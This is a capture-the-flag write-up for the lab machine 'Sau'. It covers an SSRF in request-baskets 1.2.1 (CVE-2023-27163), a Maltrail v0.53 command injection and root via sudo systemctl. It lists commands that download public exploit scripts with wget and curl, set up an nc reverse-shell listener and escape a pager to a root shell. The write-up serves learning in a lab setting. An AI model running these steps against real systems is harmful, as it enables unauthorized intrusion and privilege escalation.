# Sau

## Nmap scan

<figure><img src="../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

## Site scan

Let's check out the site on port 55555

<figure><img src="../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

We see it is running request-baskets version 1.2.1 after googling it is vulnerable to CVE-2023-27163

## CVE-2023-27163

1. First we get the exploit "wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh"
2. Next we set up nc on port 8000
3. Then run the exploit
4. WE ARE IN!!!
5. Well not rlly all we got is the webserver to request our server no reverse shell...&#x20;

Leason learned don't get tunnel vision and enumerate properly before trying to exploit.

## Deeper enumeration

I ran a gobuster scan on dns and dir mode but found nothin interesting. On the main page there is a login that asks for a master API key I tried interspting my own auth header and using that to no  avail.

What I then rembered was that port 80 was filtered so wouldn't it be great if we could get our basket to request that port locally. So i set my basket to forward to http://127.0.0.1:80 and voilla.

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

A sidenot I remeber watching an Ippsec video where he said using 127.0.0.1 is better than using localhost as localhost ca run into IPV6 problems.

We find it's running maltrail v0.53

## Exploit

To get RCE we do the following steps

1. curl -o exploit.py [https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py](https://github.com/spookier/Maltrail-v0.53-Exploit/blob/main/exploit.py)
2. nc -lvnp 9000
3. python3 exploit.py <>MY\_IP> \<PORT> http://\<IP:PORT>/\<BASKET>
4. And we get the user flag!!

## Priv esc

Running sudo -l we see we can run: /usr/bin/systemctl status trail.service

{% embed url="https://gtfobins.github.io/gtfobins/systemctl/" %}

This link shows use some exloits. Let try the third one as its shortest.

Running the command we found with sudo -l and then !/bin/bash as outlined in GTFOBins.

WE GET ROOT!!

PAWNEDD
